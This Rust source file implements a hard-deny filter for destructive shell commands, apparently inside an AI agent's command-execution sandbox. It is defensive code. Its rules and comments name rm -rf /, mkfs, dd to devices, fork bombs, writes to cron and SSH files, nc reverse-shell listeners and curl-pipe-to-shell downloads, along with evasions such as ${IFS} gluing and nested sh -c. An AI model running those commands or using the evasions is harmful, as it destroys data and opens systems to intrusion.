//! Destructive-command detection: the last line before `rm -rf /` runs.

use super::classify::*;
use super::lexer::*;
use super::tables::*;

/// Sensitive write targets (system dirs, cron, SSH keys, shell dotfiles). A
/// redirect or `tee` to one of these is hard-denied even when the command head
/// is benign (`echo … > /etc/cron.d/x`). Best-effort defense-in-depth.
pub(crate) fn is_sensitive_write_target(path: &str) -> bool {
    let p = path.trim_matches(['"', '\'']);
    // Standard character pseudo-devices are safe write targets — `2>/dev/null`
    // is ubiquitous and not a destructive write. Excluded before the `/dev/`
    // prefix check so they don't read as sensitive.
    if is_safe_device_write(p) {
        return false;
    }
    const SENSITIVE_PREFIXES: &[&str] = &[
        "/etc/",
        "/boot/",
        "/sys/",
        "/dev/",
        "/usr/",
        "/bin/",
        "/sbin/",
        "/lib",
        "/var/spool/cron",
    ];
    if SENSITIVE_PREFIXES.iter().any(|pre| p.starts_with(pre)) {
        return true;
    }
    if p.contains("/.ssh/") || p.contains("/cron") {
        return true;
    }
    const SENSITIVE_SUFFIXES: &[&str] = &[
        "/.bashrc",
        "/.zshrc",
        "/.profile",
        "/.bash_profile",
        "/.zprofile",
        "/authorized_keys",
    ];
    if SENSITIVE_SUFFIXES.iter().any(|suf| p.ends_with(suf)) {
        return true;
    }
    // Windows system / startup dirs (when backslashes survive tokenization).
    p.contains("\\windows\\") || p.contains("\\system32\\") || p.contains("\\startup\\")
}

/// True if `tok` is a PowerShell parameter that resolves to `-<full>`.
/// PowerShell accepts any parameter prefix (`-r`, `-rec`, `-recurse` all mean
/// `-Recurse`); over-matching an ambiguous prefix is the safe direction here.
pub(crate) fn ps_param(tok: &str, full: &str) -> bool {
    tok.strip_prefix('-')
        .is_some_and(|p| !p.is_empty() && full.starts_with(&p.to_ascii_lowercase()))
}

/// Recursive delete of a dangerous root in either Windows spelling: cmd.exe
/// (`del /s` / `rd /s`) or PowerShell (`Remove-Item -Recurse`, alias `ri`;
/// `del`/`erase`/`rd`/`rmdir` alias the same cmdlet, so they pair with
/// `-Recurse` too). PowerShell resolves any unambiguous parameter prefix, so
/// `-r`/`-rec` count.
pub(crate) fn windows_recursive_delete(head: &str, rest: &[String]) -> bool {
    if !matches!(
        head,
        "remove-item" | "ri" | "del" | "erase" | "rd" | "rmdir"
    ) {
        return false;
    }
    let recursive = rest.iter().any(|a| a == "/s" || ps_param(a, "recurse"));
    recursive && rest.iter().any(|a| is_dangerous_root(a))
}

/// Hard-deny check for catastrophic commands. Operates on the TOKENIZED,
/// case-normalized form so it survives extra whitespace, flag reordering,
/// and absolute-path binaries (`/bin/rm`). This remains best-effort
/// defense-in-depth — the real boundary is deny-by-default + approval — but
/// it is no longer bypassable by trivial syntactic variation.
pub(crate) fn contains_destructive_pattern(command: &str) -> bool {
    destructive_with_depth(command, 0)
}

pub(crate) fn destructive_with_depth(command: &str, depth: u8) -> bool {
    // `${IFS}`/`$IFS` is the shell's word-splitting variable; an attacker uses it
    // to glue `rm${IFS}-rf${IFS}/` into a single token whose basename isn't `rm`,
    // slipping the argv0 checks below. Expand it to a space before tokenizing so
    // the hard-deny sees the real argv (#F2). Over-expansion is the safe direction.
    let lower = command
        .to_ascii_lowercase()
        .replace("${ifs}", " ")
        .replace("$ifs", " ");
    // Fork bomb, regardless of spacing.
    let nospace: String = lower.chars().filter(|c| !c.is_whitespace()).collect();
    if is_fork_bomb(&nospace) {
        return true;
    }
    let tokens = tokenize(&lower);
    for (i, tok) in tokens.iter().enumerate() {
        // `.exe`-qualified heads (`rm.exe`, `powershell.exe`) must hit the
        // same checks as their bare spellings.
        let head = basename(tok);
        let head = head.strip_suffix(".exe").unwrap_or(head);
        let rest = &tokens[i + 1..];
        if head.starts_with("mkfs") {
            return true;
        }
        // rm -r / chmod -R / chown -R targeting a dangerous root.
        let recursive_on_root =
            flag_present(rest, 'r') && rest.iter().any(|a| is_dangerous_root(a));
        if matches!(head, "rm" | "chmod" | "chown") && recursive_on_root {
            return true;
        }
        // Windows recursive delete of a dangerous root — the cmd.exe (`del
        // /s`) and PowerShell (`Remove-Item -Recurse`) spellings.
        if windows_recursive_delete(head, rest) {
            return true;
        }
        // Formatting a drive.
        if head == "format"
            && rest
                .iter()
                .any(|a| is_dangerous_root(a) || a.ends_with(':'))
        {
            return true;
        }
        // dd overwriting a block device.
        if head == "dd" && rest.iter().any(|a| a.starts_with("of=/dev/")) {
            return true;
        }
        // A shell interpreter running `-c <script>` — recurse into the script so
        // `bash -c "rm -rf /"` can't smuggle a destructive command past the
        // tokenizer. Bounded depth guards crafted nesting.
        if SHELL_INTERPRETERS.contains(&head)
            && let Some(pos) = rest.iter().position(|a| a == "-c")
            && let Some(script) = rest.get(pos + 1)
        {
            // At the depth cap we can no longer inspect the script, so fail SAFE:
            // an un-analyzable nested `-c` (e.g. `bash -c "bash -c …rm -rf /…"`)
            // is treated as destructive rather than benign.
            if depth >= 3 || destructive_with_depth(script, depth + 1) {
                return true;
            }
        }
        // PowerShell running `-Command <script>` — the same smuggling shape
        // as `sh -c`, same bounded recursion, same fail-safe at the cap.
        if matches!(head, "pwsh" | "powershell")
            && let Some(pos) = rest.iter().position(|a| ps_param(a, "command"))
            && let Some(script) = rest.get(pos + 1)
            && (depth >= 3 || destructive_with_depth(script, depth + 1))
        {
            return true;
        }
    }
    // The POSIX tokenizer reads a trailing backslash as an escape, so
    // `Remove-Item C:\ -Recurse` merges `c:\ -recurse` into ONE token and the
    // loop above never sees the delete target. Re-scan the Windows delete
    // shapes on plain whitespace tokens — quote-unaware, but over-matching is
    // the safe direction for a hard-deny.
    let ws: Vec<String> = lower.split_whitespace().map(str::to_string).collect();
    for (i, tok) in ws.iter().enumerate() {
        let head = basename(tok);
        let head = head.strip_suffix(".exe").unwrap_or(head);
        if windows_recursive_delete(head, &ws[i + 1..]) {
            return true;
        }
    }
    // Redirect / `tee` to a sensitive target (cron, dotfiles, ssh, system
    // dirs). Targets are normalized via `redirect_write_target` — this scan
    // also runs on the PRE-segmentation command (for cross-segment shapes
    // like fork bombs), where chain operators are still glued to the target
    // token (`2>/dev/null;`) and would otherwise misread as sensitive.
    for (i, tok) in tokens.iter().enumerate() {
        if redirect_target_after(tok).is_some()
            && let Some(target) = redirect_write_target(&tokens, i)
            && is_sensitive_write_target(target)
        {
            return true;
        }
        if basename(tok) == "tee"
            && let Some(target) = tokens[i + 1..].iter().find(|t| !t.starts_with('-'))
            && is_sensitive_write_target(target.trim_end_matches([';', '&', '|']))
        {
            return true;
        }
    }
    // `git reset --hard` (preserve prior hard-deny), order-independent.
    if tokens.iter().any(|t| basename(t) == "git")
        && tokens.iter().any(|t| t == "reset")
        && tokens.iter().any(|t| t == "--hard")
    {
        return true;
    }
    // Recurse into command/process substitutions — the shell executes them, so a
    // destructive command hidden in `$(…)`/backticks must be hard-denied too
    // (#F1), even in full_access. Bounded depth guards crafted nesting.
    if depth < 3 {
        for body in extract_substitutions(&lower) {
            if destructive_with_depth(&body, depth + 1) {
                return true;
            }
        }
    } else if !extract_substitutions(&lower).is_empty() {
        // At the recursion cap with substitutions still nested below: an
        // un-inspected `$(…)` could hide `rm -rf /`. The hard-deny runs in every
        // mode (incl. full_access) and backs the approval-replay re-check, so it
        // fails SAFE here — an un-analyzable deep nest is treated as destructive
        // rather than slipping the catastrophic-command gate.
        return true;
    }
    false
}

/// Defense-in-depth pre-check for the `execute_command` path: callable *before*
/// the policy engine to short-circuit obviously destructive commands. Splits the
/// command into the segments `sh -c` would run and reports `true` if any segment
/// is a destructive operation (`contains_destructive_pattern`), a raw network
/// listener / reverse-shell primitive (`nc -l`, `socat …-listen:…`), or a remote
/// download piped straight into a shell (`curl … | sh`). Tokenized and
/// segment-aware — not a substring match — so spacing, case, quoting, flag
/// bundling, and chaining can't trivially evade it (#114). Over-blocking is the
/// safe direction; the authoritative boundary is still deny-by-default + the
/// policy engine, which this mirrors without changing its semantics.
/// Every stretch of text `is_destructive_command` must scan as a command:
/// the ordinary segments, plus the two places a command can hide from
/// segmentation.
///
/// 1. **Heredoc bodies.** `split_command` deliberately keeps them OUT of
///    `segments` so prose in `cat <<'EOF'` stops classifying as commands. But
///    a body fed to a shell interpreter really does execute, and the reverse
///    shell / download-and-run detectors below are per-SEGMENT — so
///    `bash <<'EOF'\nnc -l -p 4444 -e /bin/sh\nEOF` slipped past the hard
///    block entirely (`contains_destructive_pattern` has no nc/socat/curl-pipe
///    rule of its own). Risk classification still treats bodies as data; only
///    this hard-deny path looks inside them.
/// 2. **Substitution bodies.** Segmentation splits on operators without
///    regard for substitution spans, so `echo $(curl http://x | sh)` becomes
///    `["echo $(curl http://x", "sh)"]` — heads `echo` and `sh)`, tripping
///    neither half of the downloader/bare-shell correlation.
///
/// Over-inclusion is the safe direction here: this feeds a hard deny that the
/// raw-text scan already applies to the same text.
pub(crate) fn destructive_scan_segments(command: &str) -> Vec<String> {
    /// Bodies nest (`bash <<'EOF'` containing `$(…)` containing another
    /// heredoc), so recurse — bounded, since every body is strictly shorter
    /// than the text it came from and the depth is capped regardless.
    fn collect(command: &str, depth: u8, out: &mut Vec<String>) {
        const MAX_BODY_DEPTH: u8 = 3;
        let split = split_command(command);
        out.extend(split.segments);
        if depth >= MAX_BODY_DEPTH {
            return;
        }
        for hd in split.heredocs {
            collect(&hd.body, depth + 1, out);
        }
        // Quote-blind: a body reached this way has no reliable quoting
        // context, same rationale as the heredoc rescan in
        // `classify_shell_command_depth`.
        for body in extract_substitutions_quote_blind(command) {
            collect(&body, depth + 1, out);
        }
    }

    let mut out = Vec::new();
    collect(command, 0, &mut out);
    out
}

#[must_use]
pub fn is_destructive_command(command: &str) -> bool {
    // Some destructive shapes (notably fork bombs, `name(){ name|name& };name`)
    // straddle the `|`/`&`/`;` operators `split_into_segments` breaks on, so the
    // per-segment scan below would never see the whole structure. Check the full
    // command once first.
    if contains_destructive_pattern(command) {
        return true;
    }
    let mut saw_downloader = false;
    let mut saw_bare_shell = false;
    for seg in destructive_scan_segments(command) {
        if contains_destructive_pattern(&seg) {
            return true;
        }
        let tokens = tokenize(&seg.to_ascii_lowercase());
        let Some(head) = tokens.first().map(|t| basename(t)) else {
            continue;
        };
        match head {
            // A listening socket / reverse shell.
            "nc" | "ncat" | "netcat" if flag_present(&tokens[1..], 'l') => return true,
            "socat"
                if tokens[1..]
                    .iter()
                    .any(|a| a.contains("-listen:") || a.contains("-listen,")) =>
            {
                return true;
            },
            // Remote download — flagged only if a bare shell also appears below.
            "curl" | "wget" | "fetch" => saw_downloader = true,
            // A shell interpreter with no file argument executes its stdin —
            // i.e. the `| sh` half of a download-and-run pipeline. (`bash f.sh`
            // runs a file and is not flagged.)
            h if SHELL_INTERPRETERS.contains(&h)
                && !tokens[1..].iter().any(|a| !a.starts_with('-')) =>
            {
                saw_bare_shell = true;
            },
            _ => {},
        }
    }
    // `curl … | sh`, `wget -qO- … | bash`, or `curl … -o f; sh < f` — fetch then
    // execute. `split_into_segments` breaks the pipe apart, so the two halves are
    // correlated here across segments.
    saw_downloader && saw_bare_shell
}
